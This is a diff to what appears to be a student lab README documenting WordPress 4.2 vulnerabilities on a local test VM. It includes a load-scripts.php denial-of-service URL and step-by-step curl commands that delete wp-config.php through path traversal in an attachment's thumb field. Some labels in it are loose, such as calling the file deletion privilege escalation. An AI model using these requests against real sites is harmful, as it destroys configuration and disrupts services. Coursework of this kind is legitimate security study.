@@ -19,6 +19,7 @@ Time spent: **X** hours spent in total
 		4. XSS activated
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/media-new.php
+	
 1. (Required) 4.9.4 - Application DoS
   - [ ] Summary: The load-scripts.php is a file that was designed for admins to improve
   website performance.  WP did not have admin authentication placed so anyone could be able
@@ -33,15 +34,31 @@ Time spent: **X** hours spent in total
 		2. Enter the following URL:  http://wpdistillery.vm/wp-admin/load-scripts.php?c=1&load=editor,%20common,%20user-profile,media-widgets,media-gallery
   - [ ] Affected source code:
     - [Link 1] https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/load-scripts.php
-1. (Required) Vulnerability Name or ID
-  - [ ] Summary: 
-    - Vulnerability types:
-    - Tested in version:
-    - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+	
+1. (Required) 4.9.6 - Authenticated Arbitrary File Deletion
+  - [ ] Summary: Attacker can execute arbitrary code that deletes the wp-config.php file
+by first deleting a post.  Since there is no check in place to make sure that the file exists
+before deleting, the code executed again will delete the first thing that comes up under the
+corresponding id for that file, which would be the wp-config.php file.
+    - Vulnerability types: Privelege Escalation
+    - Tested in version: 4.2
+    - Fixed in version: 4.2.21
+  - [ ] GIF Walkthrough: https://github.com/smr1234/WebApplicationSecurity/blob/master/Week7/AuthenticatedArbitraryFileDeletion.gif
   - [ ] Steps to recreate: 
+		1. Upload an image to the media library
+		2. Take note of the itemid value
+		3. Visit the "Edit Media" page and navigate to your post
+		4. Find the id "_wpnonce" in the HTML
+		5. Enter the following command:  curl -v 'wpdistillery.vm/wp-admin/post.php?post=***' -H 'Cookie: ***' -d 'action=editattachment&_wpnonce=***&thumb=../../../../wp-config.php'
+		Fill *** with your itemid for post, cookies, and _wpnonce
+		6. Find _wpnonce in the class='submitdelete deletion'
+		7. curl -v 'wpdistillery.vm/wp-admin/post.php?post=***' -H 'Cookie: ***' -d 'action=delete&_wpnonce=***'
+		8. Fill *** with your itemid for post, cookies, and _wpnonce
+		9. Reload the page
+		10. Done
   - [ ] Affected source code:
-    - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
+    - [Link 1]https://core.trac.wordpress.org/browser/tags/4.2/src/wp-admin/post.php
+	
 1. (Optional) Vulnerability Name or ID
   - [ ] Summary: 
     - Vulnerability types:
